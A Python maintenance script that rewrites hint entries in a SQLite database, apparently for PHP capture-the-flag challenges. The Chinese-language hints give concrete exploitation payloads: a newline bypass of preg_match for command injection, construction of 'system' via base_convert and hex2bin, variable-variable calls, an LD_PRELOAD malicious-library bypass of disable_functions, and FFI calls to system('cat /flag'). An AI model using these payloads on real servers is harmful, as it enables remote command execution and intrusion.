"""Fix hint content that was mangled by shell $ escaping."""
import sqlite3

conn = sqlite3.connect("data/dashboard.db", timeout=10)

FIXES = {
    17: (
        "preg_match用^和$锚定，但只检查第一行。"
        "在JSON中用换行符绕过：发送含实际换行字符的JSON。"
        "Python中构造：import json; data={'cmd':'ls\\n/bin/cat /flag'}; "
        "然后 requests.post(url, json=data)。"
        "preg_match只匹配第一行，第二行的命令会执行。"
    ),
    19: (
        "80字符长度限制下，利用 $pi=base_convert 构造动态函数名。"
        "关键思路：base_convert(2146934604002,10,36) 返回 hex2bin，"
        "再用 hex2bin 将十六进制字符串转为任意函数名字符串。"
        "例如 hex2bin('73797374656d') = 'system'。"
    ),
    20: (
        "另一个思路：$$var 可以间接引用变量。"
        "例如 $_='system';$$_('cat /flag') 等于 system('cat /flag')。"
        "变量名 _ 只有一个字符，非常节省空间。"
        "也可以用 ${'_'}('cat /flag') 语法。"
    ),
    22: (
        "绕过 disable_functions 的方法：用 LD_PRELOAD 劫持。"
        "步骤：1) 利用蚁剑或fwrite写入一个恶意.so共享库到/tmp；"
        "2) 用 putenv('LD_PRELOAD=/tmp/evil.so') 设置环境变量；"
        "3) 调用 mail() 或 error_log() 等未禁用函数触发加载 .so；"
        "4) 恶意.so的构造：在 __attribute__((constructor)) 中执行 system('cat /flag')。"
        "也可以直接用蚁剑的 disable_functions 插件一键绕过。"
    ),
    23: (
        "另一个方法：PHP 7.4+ 的 FFI 扩展。"
        "如果 PHP 版本 >= 7.4 且 FFI enabled，"
        "可以用 FFI::cdef('int system(const char *command);')->system('cat /flag') 直接执行命令。"
        "先用 phpinfo() 或 php -v 检查 PHP 版本和 FFI 是否开启。"
    ),
}

for hid, content in FIXES.items():
    conn.execute("UPDATE hints SET content=? WHERE id=?", (content, hid))
    print(f"Fixed hint {hid}: {content[:70]}...")

conn.commit()
print(f"\nFixed {len(FIXES)} hints")

# Final verification
rows = conn.execute(
    "SELECT id, challenge_id, content FROM hints WHERE used_in_attempt IS NULL ORDER BY challenge_id, id"
).fetchall()
print(f"\n=== All PENDING hints ({len(rows)} total) ===")
for r in rows:
    print(f"  cid={r[1]} id={r[0]}: {r[2][:80]}")

conn.close()
